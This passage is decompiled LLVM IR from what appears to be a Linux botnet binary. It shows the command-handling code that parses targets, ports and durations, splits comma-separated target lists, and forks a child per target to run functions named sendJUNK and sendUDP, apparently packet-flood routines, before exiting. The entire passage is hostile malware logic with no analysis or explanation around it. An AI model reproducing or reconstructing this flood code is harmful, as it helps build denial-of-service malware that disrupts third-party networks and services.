  store i1 %v5_804c7df, i1* %cf.global-to-local, align 1
  %v1_804c80b = call i32 @atol(i32 %v2_804c805)
  %v2_804c81c = load i32, i32* %v1_804c7dd, align 4
  store i1 %v5_804c7df, i1* %cf.global-to-local, align 1
  %v1_804c822 = call i32 @atol(i32 %v2_804c81c)
  %v5_804c830 = icmp ult i32* %stack_var_-268, inttoptr (i32 8 to i32*)
  store i1 %v5_804c830, i1* %cf.global-to-local, align 1
  %v2_804c836 = inttoptr i32 %v2_804c7fa to i8*
  %v3_804c836 = call i32 @__GI_strchr(i8* %v2_804c836, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c83e = icmp eq i32 %v3_804c836, 0
  br i1 %v1_804c83e, label %dec_label_pc_804c8b0, label %dec_label_pc_804c842

dec_label_pc_804c842:                             ; preds = %dec_label_pc_804c7f4
  store i32 %v2_804c7fa, i32* @eax, align 4
  store i1 %v5_804c830, i1* %cf.global-to-local, align 1
  %v2_804c84e = call i32 @__GI_strtok(i32 %v2_804c7fa, i32 ptrtoint (i32* @global_var_80529d4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c8a8160 = icmp eq i32 %v2_804c84e, 0
  %v1_804c8ac161 = icmp eq i1 %v4_804c8a8160, false
  br i1 %v1_804c8ac161, label %dec_label_pc_804c85b, label %dec_label_pc_804c8ec

dec_label_pc_804c85b:                             ; preds = %dec_label_pc_804c842, %dec_label_pc_804c893
  %storemerge61162 = phi i32 [ %v2_804c89d, %dec_label_pc_804c893 ], [ %v2_804c84e, %dec_label_pc_804c842 ]
  %v0_804c85b = call i32 @listFork()
  store i32 %v0_804c85b, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c860 = icmp eq i32 %v0_804c85b, 0
  %v1_804c862 = icmp eq i1 %v1_804c860, false
  %v0_804c893 = load i32, i32* @esp, align 4
  br i1 %v1_804c862, label %dec_label_pc_804c893, label %dec_label_pc_804c864

dec_label_pc_804c864:                             ; preds = %dec_label_pc_804c85b
  %v5_804c864 = icmp ult i32 %v0_804c893, 4
  store i1 %v5_804c864, i1* %cf.global-to-local, align 1
  %v3_804c870 = call i32 @sendJUNK(i32 %storemerge61162, i32 %v1_804c80b, i32 %v1_804c822)
  %v0_804c878 = load i32, i32* @global_var_8055420.26, align 32
  store i1 %v5_804c7df, i1* %cf.global-to-local, align 1
  %v1_804c881 = call i32 @__libc_close(i32 %v0_804c878)
  store i1 %v5_804c7df, i1* %cf.global-to-local, align 1
  %v1_804c88e = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c893:                             ; preds = %dec_label_pc_804c85b
  %v5_804c893 = icmp ult i32 %v0_804c893, 8
  store i1 %v5_804c893, i1* %cf.global-to-local, align 1
  %v2_804c89d = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80529d4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c8a8 = icmp eq i32 %v2_804c89d, 0
  %v1_804c8ac = icmp eq i1 %v4_804c8a8, false
  br i1 %v1_804c8ac, label %dec_label_pc_804c85b, label %dec_label_pc_804c8ec

dec_label_pc_804c8b0:                             ; preds = %dec_label_pc_804c7f4
  %v0_804c8b0 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c8b5 = icmp eq i32 %v0_804c8b0, 0
  %v1_804c8b7 = icmp eq i1 %v1_804c8b5, false
  br i1 %v1_804c8b7, label %dec_label_pc_804cf8b, label %dec_label_pc_804c8bd

dec_label_pc_804c8bd:                             ; preds = %dec_label_pc_804c8b0
  %v0_804c8bd = load i32, i32* @esp, align 4
  %v5_804c8bd = icmp ult i32 %v0_804c8bd, 4
  store i1 %v5_804c8bd, i1* %cf.global-to-local, align 1
  %v3_804c8c9 = call i32 @sendJUNK(i32 %v2_804c7fa, i32 %v1_804c80b, i32 %v1_804c822)
  %v0_804c8d1 = load i32, i32* @global_var_8055420.26, align 32
  store i1 %v5_804c7df, i1* %cf.global-to-local, align 1
  %v1_804c8da = call i32 @__libc_close(i32 %v0_804c8d1)
  store i1 %v5_804c7df, i1* %cf.global-to-local, align 1
  %v1_804c8e7 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c8ec:                             ; preds = %dec_label_pc_804c842, %dec_label_pc_804c893, %dec_label_pc_804c766
  %v2_804c8ef = load i32, i32* %v1_804c50c, align 4
  %v4_804c90c = inttoptr i32 %v2_804c8ef to i8*
  store i32 ptrtoint ([4 x i8]* @global_var_8052a21.59 to i32), i32* @edi, align 4
  %v7_804c91e = call i32 @_strncmp(i8* %v4_804c90c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052a21.59, i32 0, i32 0), i32 4)
  %v8_804c91e = urem i32 %v7_804c91e, 2
  %v9_804c91e = icmp eq i32 %v8_804c91e, 0
  %v0_804c920 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c920 = or i1 %v0_804c920, %v9_804c91e
  %v3_804c920 = zext i1 %v2_804c920 to i32
  %v4_804c920 = load i32, i32* @edx, align 4
  %v5_804c920 = and i32 %v4_804c920, -256
  %v6_804c920 = or i32 %v3_804c920, %v5_804c920
  %v7_804c920 = xor i32 %v6_804c920, 1
  store i32 %v7_804c920, i32* @edx, align 4
  %v1_804c928 = trunc i32 %v7_804c920 to i8
  %v3_804c928 = zext i1 %v0_804c920 to i8
  %v4_804c928 = sub nsw i8 %v1_804c928, %v3_804c928
  %v15_804c928 = icmp eq i8 %v4_804c928, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c931 = icmp eq i1 %v15_804c928, false
  br i1 %v1_804c931, label %dec_label_pc_804cb81, label %dec_label_pc_804c937

dec_label_pc_804c937:                             ; preds = %dec_label_pc_804c8ec
  %v2_804c92c = sext i8 %v4_804c928 to i32
  %v9_804c937 = icmp ult i32 %tmp109, 5
  store i1 %v9_804c937, i1* %cf.global-to-local, align 1
  %v7_804c93b = icmp sgt i32 %tmp109, 5
  br i1 %v7_804c93b, label %dec_label_pc_804c941, label %dec_label_pc_804cf8b

dec_label_pc_804c941:                             ; preds = %dec_label_pc_804c937
  %v1_804c944 = add i32 %tmp119, 12
  %v1_804c947 = inttoptr i32 %v1_804c944 to i32*
  %v2_804c947 = load i32, i32* %v1_804c947, align 4
  %v0_804c949 = load i32, i32* @esp, align 4
  %v5_804c949 = icmp ult i32 %v0_804c949, 12
  store i1 %v5_804c949, i1* %cf.global-to-local, align 1
  %v1_804c94d = call i32 @atol(i32 %v2_804c947)
  %v5_804c955 = icmp ne i32 %v1_804c94d, -1
  store i1 %v5_804c955, i1* %cf.global-to-local, align 1
  %v10_804c955 = icmp eq i32 %v1_804c94d, -1
  br i1 %v10_804c955, label %dec_label_pc_804cf8b, label %dec_label_pc_804c95e

dec_label_pc_804c95e:                             ; preds = %dec_label_pc_804c941
  %v1_804c961 = add i32 %tmp119, 8
  %v1_804c964 = inttoptr i32 %v1_804c961 to i32*
  %v2_804c964 = load i32, i32* %v1_804c964, align 4
  %v5_804c966 = icmp ult i32* %stack_var_-268, inttoptr (i32 12 to i32*)
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804c96a = call i32 @atol(i32 %v2_804c964)
  %v5_804c972 = icmp ne i32 %v1_804c96a, -1
  store i1 %v5_804c972, i1* %cf.global-to-local, align 1
  %v10_804c972 = icmp eq i32 %v1_804c96a, -1
  br i1 %v10_804c972, label %dec_label_pc_804cf8b, label %dec_label_pc_804c97b

dec_label_pc_804c97b:                             ; preds = %dec_label_pc_804c95e
  %v1_804c97e = add i32 %tmp119, 16
  %v1_804c981 = inttoptr i32 %v1_804c97e to i32*
  %v2_804c981 = load i32, i32* %v1_804c981, align 4
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804c987 = call i32 @atol(i32 %v2_804c981)
  %v5_804c98f = icmp ne i32 %v1_804c987, -1
  store i1 %v5_804c98f, i1* %cf.global-to-local, align 1
  %v10_804c98f = icmp eq i32 %v1_804c987, -1
  br i1 %v10_804c98f, label %dec_label_pc_804cf8b, label %dec_label_pc_804c998

dec_label_pc_804c998:                             ; preds = %dec_label_pc_804c97b
  %v1_804c99b = add i32 %tmp119, 20
  %v1_804c99e = inttoptr i32 %v1_804c99b to i32*
  %v2_804c99e = load i32, i32* %v1_804c99e, align 4
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804c9a4 = call i32 @atol(i32 %v2_804c99e)
  %v5_804c9ac = icmp ne i32 %v1_804c9a4, -1
  store i1 %v5_804c9ac, i1* %cf.global-to-local, align 1
  %v10_804c9ac = icmp eq i32 %v1_804c9a4, -1
  br i1 %v10_804c9ac, label %dec_label_pc_804cf8b, label %dec_label_pc_804c9b5

dec_label_pc_804c9b5:                             ; preds = %dec_label_pc_804c998
  %v2_804c9bb = load i32, i32* %v1_804c99e, align 4
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804c9c1 = call i32 @atol(i32 %v2_804c9bb)
  %v1_804c9c9 = add i32 %v1_804c9c1, -65500
  %v5_804c9c9 = icmp ult i32 %v1_804c9c1, 65500
  %v6_804c9c9 = sub i32 65499, %v1_804c9c1
  %v7_804c9c9 = and i32 %v6_804c9c9, %v1_804c9c1
  %v8_804c9c9 = icmp slt i32 %v7_804c9c9, 0
  store i1 %v5_804c9c9, i1* %cf.global-to-local, align 1
  %v9_804c9c9 = icmp eq i32 %v1_804c9c9, 0
  %v10_804c9c9 = icmp slt i32 %v1_804c9c9, 0
  %v3_804c9ce = icmp eq i1 %v10_804c9c9, %v8_804c9c9
  %v4_804c9ce = icmp eq i1 %v9_804c9c9, false
  %v5_804c9ce = and i1 %v4_804c9ce, %v3_804c9ce
  br i1 %v5_804c9ce, label %dec_label_pc_804cf8b, label %dec_label_pc_804c9d4

dec_label_pc_804c9d4:                             ; preds = %dec_label_pc_804c9b5
  %v2_804c9da = load i32, i32* %v1_804c981, align 4
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804c9e0 = call i32 @atol(i32 %v2_804c9da)
  %v1_804c9e8 = add i32 %v1_804c9e0, -32
  %v2_804c9e8 = icmp ult i32 %v1_804c9e0, 32
  %v3_804c9e8 = sub i32 31, %v1_804c9e0
  %v4_804c9e8 = and i32 %v3_804c9e8, %v1_804c9e0
  %v5_804c9e8 = icmp slt i32 %v4_804c9e8, 0
  store i1 %v2_804c9e8, i1* %cf.global-to-local, align 1
  %v6_804c9e8 = icmp eq i32 %v1_804c9e8, 0
  %v7_804c9e8 = icmp slt i32 %v1_804c9e8, 0
  %v3_804c9eb = icmp eq i1 %v7_804c9e8, %v5_804c9e8
  %v4_804c9eb = icmp eq i1 %v6_804c9e8, false
  %v5_804c9eb = and i1 %v4_804c9eb, %v3_804c9eb
  br i1 %v5_804c9eb, label %dec_label_pc_804cf8b, label %dec_label_pc_804c9f1

dec_label_pc_804c9f1:                             ; preds = %dec_label_pc_804c9d4
  %v8_804c9f1 = icmp ult i32 %tmp109, 7
  store i1 %v8_804c9f1, i1* %cf.global-to-local, align 1
  %v12_804c9f1 = icmp eq i32 %tmp109, 7
  %v1_804c9f5 = icmp eq i1 %v12_804c9f1, false
  br i1 %v1_804c9f5, label %dec_label_pc_804ca14, label %dec_label_pc_804c9f7

dec_label_pc_804c9f7:                             ; preds = %dec_label_pc_804c9f1
  %v1_804c9fa = add i32 %tmp119, 24
  %v1_804c9fd = inttoptr i32 %v1_804c9fa to i32*
  %v2_804c9fd = load i32, i32* %v1_804c9fd, align 4
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804ca03 = call i32 @atol(i32 %v2_804c9fd)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp140 = icmp slt i32 %v1_804ca03, 1
  %tmp141 = icmp eq i1 %tmp140, false
  br i1 %tmp141, label %dec_label_pc_804ca14, label %dec_label_pc_804cf8b

dec_label_pc_804ca14:                             ; preds = %dec_label_pc_804c9f7, %dec_label_pc_804c9f1
  %v1_804ca17 = add i32 %tmp119, 4
  %v1_804ca1a = inttoptr i32 %v1_804ca17 to i32*
  %v2_804ca1a = load i32, i32* %v1_804ca1a, align 4
  %v2_804ca25 = load i32, i32* %v1_804c964, align 4
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804ca2b = call i32 @atol(i32 %v2_804ca25)
  %v2_804ca3c = load i32, i32* %v1_804c947, align 4
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804ca42 = call i32 @atol(i32 %v2_804ca3c)
  %v2_804ca53 = load i32, i32* %v1_804c981, align 4
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804ca59 = call i32 @atol(i32 %v2_804ca53)
  %v2_804ca6a = load i32, i32* %v1_804c99e, align 4
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804ca70 = call i32 @atol(i32 %v2_804ca6a)
  store i1 %v8_804c9f1, i1* %cf.global-to-local, align 1
  br i1 %v1_804c9f5, label %dec_label_pc_804caa7, label %dec_label_pc_804ca81

dec_label_pc_804ca81:                             ; preds = %dec_label_pc_804ca14
  %v1_804ca84 = add i32 %tmp119, 24
  %v1_804ca87 = inttoptr i32 %v1_804ca84 to i32*
  %v2_804ca87 = load i32, i32* %v1_804ca87, align 4
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804ca8d = call i32 @atol(i32 %v2_804ca87)
  %v0_804ca92 = load i32, i32* @esp, align 4
  %v2_804ca92 = icmp ugt i32 %v0_804ca92, -17
  store i1 %v2_804ca92, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804caa7

dec_label_pc_804caa7:                             ; preds = %dec_label_pc_804ca14, %dec_label_pc_804ca81
  %storemerge20 = phi i32 [ %v1_804ca8d, %dec_label_pc_804ca81 ], [ 10, %dec_label_pc_804ca14 ]
  store i32 %storemerge20, i32* @esi, align 4
  %v5_804cab3 = icmp ult i32* %stack_var_-268, inttoptr (i32 8 to i32*)
  store i1 %v5_804cab3, i1* %cf.global-to-local, align 1
  %v2_804cab9 = inttoptr i32 %v2_804ca1a to i8*
  %v3_804cab9 = call i32 @__GI_strchr(i8* %v2_804cab9, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cac1 = icmp eq i32 %v3_804cab9, 0
  br i1 %v1_804cac1, label %dec_label_pc_804cb3c, label %dec_label_pc_804cac5

dec_label_pc_804cac5:                             ; preds = %dec_label_pc_804caa7
  store i32 %v2_804ca1a, i32* @eax, align 4
  store i1 %v5_804cab3, i1* %cf.global-to-local, align 1
  %v2_804cad1 = call i32 @__GI_strtok(i32 %v2_804ca1a, i32 ptrtoint (i32* @global_var_80529d4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cb34157 = icmp eq i32 %v2_804cad1, 0
  %v1_804cb38158 = icmp eq i1 %v4_804cb34157, false
  br i1 %v1_804cb38158, label %dec_label_pc_804cade, label %dec_label_pc_804cb81

dec_label_pc_804cade:                             ; preds = %dec_label_pc_804cac5, %dec_label_pc_804cb1f
  %storemerge62159 = phi i32 [ %v2_804cb29, %dec_label_pc_804cb1f ], [ %v2_804cad1, %dec_label_pc_804cac5 ]
  %v0_804cade = call i32 @listFork()
  store i32 %v0_804cade, i32* @eax, align 4
  %v1_804cae3 = icmp eq i32 %v0_804cade, 0
  %v1_804cae5 = icmp eq i1 %v1_804cae3, false
  %v0_804cb1f = load i32, i32* @esp, align 4
  %v5_804cb1f = icmp ult i32 %v0_804cb1f, 8
  store i1 %v5_804cb1f, i1* %cf.global-to-local, align 1
  br i1 %v1_804cae5, label %dec_label_pc_804cb1f, label %dec_label_pc_804cae7

dec_label_pc_804cae7:                             ; preds = %dec_label_pc_804cade
  %v6_804cafc = call i32 @sendUDP(i32 %storemerge62159, i32 %v1_804ca2b, i32 %v1_804ca42, i32 %v1_804ca59, i32 %v1_804ca70, i32 %storemerge20)
  %v0_804cb04 = load i32, i32* @global_var_8055420.26, align 32
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804cb0d = call i32 @__libc_close(i32 %v0_804cb04)
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804cb1a = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cb1f:                             ; preds = %dec_label_pc_804cade
  %v2_804cb29 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80529d4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cb34 = icmp eq i32 %v2_804cb29, 0
  %v1_804cb38 = icmp eq i1 %v4_804cb34, false
  br i1 %v1_804cb38, label %dec_label_pc_804cade, label %dec_label_pc_804cb81

dec_label_pc_804cb3c:                             ; preds = %dec_label_pc_804caa7
  %v0_804cb3c = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cb41 = icmp eq i32 %v0_804cb3c, 0
  %v1_804cb43 = icmp eq i1 %v1_804cb41, false
  br i1 %v1_804cb43, label %dec_label_pc_804cf8b, label %dec_label_pc_804cb49

dec_label_pc_804cb49:                             ; preds = %dec_label_pc_804cb3c
  %v0_804cb49 = load i32, i32* @esp, align 4
  %v5_804cb49 = icmp ult i32 %v0_804cb49, 8
  store i1 %v5_804cb49, i1* %cf.global-to-local, align 1
  %v6_804cb5e = call i32 @sendUDP(i32 %v2_804ca1a, i32 %v1_804ca2b, i32 %v1_804ca42, i32 %v1_804ca59, i32 %v1_804ca70, i32 %storemerge20)
  %v0_804cb66 = load i32, i32* @global_var_8055420.26, align 32
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804cb6f = call i32 @__libc_close(i32 %v0_804cb66)
  store i1 %v5_804c966, i1* %cf.global-to-local, align 1
  %v1_804cb7c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cb81:                             ; preds = %dec_label_pc_804cac5, %dec_label_pc_804cb1f, %dec_label_pc_804c8ec
  %v2_804cb84 = load i32, i32* %v1_804c50c, align 4
  %v4_804cba1 = inttoptr i32 %v2_804cb84 to i8*
  %v7_804cbb3 = call i32 @_strncmp(i8* %v4_804cba1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052a25.60, i32 0, i32 0), i32 4)
  %v8_804cbb3 = urem i32 %v7_804cbb3, 2
  %v9_804cbb3 = icmp eq i32 %v8_804cbb3, 0
  %v0_804cbb5 = load i1, i1* %cf.global-to-local, align 1
  %v2_804cbb5 = or i1 %v0_804cbb5, %v9_804cbb3
  %v3_804cbb5 = zext i1 %v2_804cbb5 to i32
  %v4_804cbb5 = load i32, i32* @edx, align 4
  %v5_804cbb5 = and i32 %v4_804cbb5, -256
  %v6_804cbb5 = or i32 %v3_804cbb5, %v5_804cbb5
  %v7_804cbb5 = xor i32 %v6_804cbb5, 1
  store i32 %v7_804cbb5, i32* @edx, align 4
  %v1_804cbbd = trunc i32 %v7_804cbb5 to i8
  %v3_804cbbd = zext i1 %v0_804cbb5 to i8
  %v4_804cbbd = sub nsw i8 %v1_804cbbd, %v3_804cbbd
  %v15_804cbbd = icmp eq i8 %v4_804cbbd, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cbc6 = icmp eq i1 %v15_804cbbd, false
  br i1 %v1_804cbc6, label %dec_label_pc_804ce2b, label %dec_label_pc_804cbcc

dec_label_pc_804cbcc:                             ; preds = %dec_label_pc_804cb81
  %v2_804cbc1 = sext i8 %v4_804cbbd to i32
  %v9_804cbcc = icmp ult i32 %tmp109, 5
  store i1 %v9_804cbcc, i1* %cf.global-to-local, align 1
  %v7_804cbd0 = icmp sgt i32 %tmp109, 5
  br i1 %v7_804cbd0, label %dec_label_pc_804cbd6, label %dec_label_pc_804cf8b

dec_label_pc_804cbd6:                             ; preds = %dec_label_pc_804cbcc
  %v1_804cbd9 = add i32 %tmp119, 12
  %v1_804cbdc = inttoptr i32 %v1_804cbd9 to i32*
  %v2_804cbdc = load i32, i32* %v1_804cbdc, align 4
  %v0_804cbde = load i32, i32* @esp, align 4
  %v5_804cbde = icmp ult i32 %v0_804cbde, 12
  store i1 %v5_804cbde, i1* %cf.global-to-local, align 1
  %v1_804cbe2 = call i32 @atol(i32 %v2_804cbdc)
  %v5_804cbea = icmp ne i32 %v1_804cbe2, -1
  store i1 %v5_804cbea, i1* %cf.global-to-local, align 1
  %v10_804cbea = icmp eq i32 %v1_804cbe2, -1
  br i1 %v10_804cbea, label %dec_label_pc_804cf8b, label %dec_label_pc_804cbf3

dec_label_pc_804cbf3:                             ; preds = %dec_label_pc_804cbd6
  %v1_804cbf6 = add i32 %tmp119, 8
  %v1_804cbf9 = inttoptr i32 %v1_804cbf6 to i32*
  %v2_804cbf9 = load i32, i32* %v1_804cbf9, align 4
  %v5_804cbfb = icmp ult i32* %stack_var_-268, inttoptr (i32 12 to i32*)
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804cbff = call i32 @atol(i32 %v2_804cbf9)
  %v5_804cc07 = icmp ne i32 %v1_804cbff, -1
  store i1 %v5_804cc07, i1* %cf.global-to-local, align 1
  %v10_804cc07 = icmp eq i32 %v1_804cbff, -1
  br i1 %v10_804cc07, label %dec_label_pc_804cf8b, label %dec_label_pc_804cc10

dec_label_pc_804cc10:                             ; preds = %dec_label_pc_804cbf3
  %v1_804cc13 = add i32 %tmp119, 16
  %v1_804cc16 = inttoptr i32 %v1_804cc13 to i32*
  %v2_804cc16 = load i32, i32* %v1_804cc16, align 4
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804cc1c = call i32 @atol(i32 %v2_804cc16)
  %v5_804cc24 = icmp ne i32 %v1_804cc1c, -1
  store i1 %v5_804cc24, i1* %cf.global-to-local, align 1
  %v10_804cc24 = icmp eq i32 %v1_804cc1c, -1
  br i1 %v10_804cc24, label %dec_label_pc_804cf8b, label %dec_label_pc_804cc2d

dec_label_pc_804cc2d:                             ; preds = %dec_label_pc_804cc10
  %v2_804cc33 = load i32, i32* %v1_804cc16, align 4
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804cc39 = call i32 @atol(i32 %v2_804cc33)
  %v1_804cc41 = add i32 %v1_804cc39, -32
  %v2_804cc41 = icmp ult i32 %v1_804cc39, 32
  %v3_804cc41 = sub i32 31, %v1_804cc39
  %v4_804cc41 = and i32 %v3_804cc41, %v1_804cc39
  %v5_804cc41 = icmp slt i32 %v4_804cc41, 0
  store i1 %v2_804cc41, i1* %cf.global-to-local, align 1
  %v6_804cc41 = icmp eq i32 %v1_804cc41, 0
  %v7_804cc41 = icmp slt i32 %v1_804cc41, 0
  %v3_804cc44 = icmp eq i1 %v7_804cc41, %v5_804cc41
  %v4_804cc44 = icmp eq i1 %v6_804cc41, false
  %v5_804cc44 = and i1 %v4_804cc44, %v3_804cc44
  br i1 %v5_804cc44, label %dec_label_pc_804cf8b, label %dec_label_pc_804cc4a

dec_label_pc_804cc4a:                             ; preds = %dec_label_pc_804cc2d
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804cc4e = icmp sgt i32 %tmp109, 6
  br i1 %v7_804cc4e, label %dec_label_pc_804cc50, label %dec_label_pc_804cc6c.thread

dec_label_pc_804cc6c.thread:                      ; preds = %dec_label_pc_804cc4a
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cc8f

dec_label_pc_804cc50:                             ; preds = %dec_label_pc_804cc4a
  %v1_804cc53 = add i32 %tmp119, 24
  %v1_804cc56 = inttoptr i32 %v1_804cc53 to i32*
  %v2_804cc56 = load i32, i32* %v1_804cc56, align 4
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804cc5c = call i32 @atol(i32 %v2_804cc56)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804cc64 = icmp slt i32 %v1_804cc5c, 0
  br i1 %v2_804cc64, label %dec_label_pc_804cf8b, label %dec_label_pc_804cc6c

dec_label_pc_804cc6c:                             ; preds = %dec_label_pc_804cc50
  %v8_804cc6c = icmp ult i32 %tmp109, 8
  store i1 %v8_804cc6c, i1* %cf.global-to-local, align 1
  %v12_804cc6c = icmp eq i32 %tmp109, 8
  %v1_804cc70 = icmp eq i1 %v12_804cc6c, false
  br i1 %v1_804cc70, label %dec_label_pc_804cc8f, label %dec_label_pc_804cc72

dec_label_pc_804cc72:                             ; preds = %dec_label_pc_804cc6c
  %v1_804cc75 = add i32 %tmp119, 28
  %v1_804cc78 = inttoptr i32 %v1_804cc75 to i32*
  %v2_804cc78 = load i32, i32* %v1_804cc78, align 4
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804cc7e = call i32 @atol(i32 %v2_804cc78)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp142 = icmp slt i32 %v1_804cc7e, 1
  %tmp143 = icmp eq i1 %tmp142, false
  br i1 %tmp143, label %dec_label_pc_804cc8f, label %dec_label_pc_804cf8b

dec_label_pc_804cc8f:                             ; preds = %dec_label_pc_804cc6c.thread, %dec_label_pc_804cc72, %dec_label_pc_804cc6c
  %v8_804cc6c147 = phi i1 [ true, %dec_label_pc_804cc6c.thread ], [ %v8_804cc6c, %dec_label_pc_804cc72 ], [ %v8_804cc6c, %dec_label_pc_804cc6c ]
  %v1_804cc70149 = phi i1 [ true, %dec_label_pc_804cc6c.thread ], [ false, %dec_label_pc_804cc72 ], [ true, %dec_label_pc_804cc6c ]
  %v1_804cc92 = add i32 %tmp119, 4
  %v1_804cc95 = inttoptr i32 %v1_804cc92 to i32*
  %v2_804cc95 = load i32, i32* %v1_804cc95, align 4
  %v2_804cca0 = load i32, i32* %v1_804cbf9, align 4
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804cca6 = call i32 @atol(i32 %v2_804cca0)
  %v2_804ccb7 = load i32, i32* %v1_804cbdc, align 4
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804ccbd = call i32 @atol(i32 %v2_804ccb7)
  %v2_804ccce = load i32, i32* %v1_804cc16, align 4
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804ccd4 = call i32 @atol(i32 %v2_804ccce)
  %v1_804cce2 = add i32 %tmp119, 20
  %v1_804cce5 = inttoptr i32 %v1_804cce2 to i32*
  %v2_804cce5 = load i32, i32* %v1_804cce5, align 4
  store i1 %v8_804cc6c147, i1* %cf.global-to-local, align 1
  br i1 %v1_804cc70149, label %dec_label_pc_804cd16, label %dec_label_pc_804ccf0

dec_label_pc_804ccf0:                             ; preds = %dec_label_pc_804cc8f
  %v1_804ccf3 = add i32 %tmp119, 28
  %v1_804ccf6 = inttoptr i32 %v1_804ccf3 to i32*
  %v2_804ccf6 = load i32, i32* %v1_804ccf6, align 4
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804ccfc = call i32 @atol(i32 %v2_804ccf6)
  %v0_804cd01 = load i32, i32* @esp, align 4
  %v2_804cd01 = icmp ugt i32 %v0_804cd01, -17
  store i1 %v2_804cd01, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cd16

dec_label_pc_804cd16:                             ; preds = %dec_label_pc_804cc8f, %dec_label_pc_804ccf0
  %storemerge18 = phi i32 [ %v1_804ccfc, %dec_label_pc_804ccf0 ], [ 10, %dec_label_pc_804cc8f ]
  store i32 %storemerge18, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804cc4e, label %dec_label_pc_804cd25, label %dec_label_pc_804cd4b

dec_label_pc_804cd25:                             ; preds = %dec_label_pc_804cd16
  %v1_804cd28 = add i32 %tmp119, 24
  %v1_804cd2b = inttoptr i32 %v1_804cd28 to i32*
  %v2_804cd2b = load i32, i32* %v1_804cd2b, align 4
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804cd31 = call i32 @atol(i32 %v2_804cd2b)
  %v0_804cd36 = load i32, i32* @esp, align 4
  %v2_804cd36 = icmp ugt i32 %v0_804cd36, -17
  store i1 %v2_804cd36, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804cd4b

dec_label_pc_804cd4b:                             ; preds = %dec_label_pc_804cd16, %dec_label_pc_804cd25
  %storemerge17 = phi i32 [ %v1_804cd31, %dec_label_pc_804cd25 ], [ 0, %dec_label_pc_804cd16 ]
  store i32 %storemerge17, i32* @edi, align 4
  %v5_804cd57 = icmp ult i32* %stack_var_-268, inttoptr (i32 8 to i32*)
  store i1 %v5_804cd57, i1* %cf.global-to-local, align 1
  %v2_804cd5d = inttoptr i32 %v2_804cc95 to i8*
  %v3_804cd5d = call i32 @__GI_strchr(i8* %v2_804cd5d, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cd65 = icmp eq i32 %v3_804cd5d, 0
  br i1 %v1_804cd65, label %dec_label_pc_804cde3, label %dec_label_pc_804cd69

dec_label_pc_804cd69:                             ; preds = %dec_label_pc_804cd4b
  store i32 %v2_804cc95, i32* @eax, align 4
  store i1 %v5_804cd57, i1* %cf.global-to-local, align 1
  %v2_804cd75 = call i32 @__GI_strtok(i32 %v2_804cc95, i32 ptrtoint (i32* @global_var_80529d4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cddb154 = icmp eq i32 %v2_804cd75, 0
  %v1_804cddf155 = icmp eq i1 %v4_804cddb154, false
  br i1 %v1_804cddf155, label %dec_label_pc_804cd82, label %dec_label_pc_804ce2b

dec_label_pc_804cd82:                             ; preds = %dec_label_pc_804cd69, %dec_label_pc_804cdc6
  %storemerge16156 = phi i32 [ %v2_804cdd0, %dec_label_pc_804cdc6 ], [ %v2_804cd75, %dec_label_pc_804cd69 ]
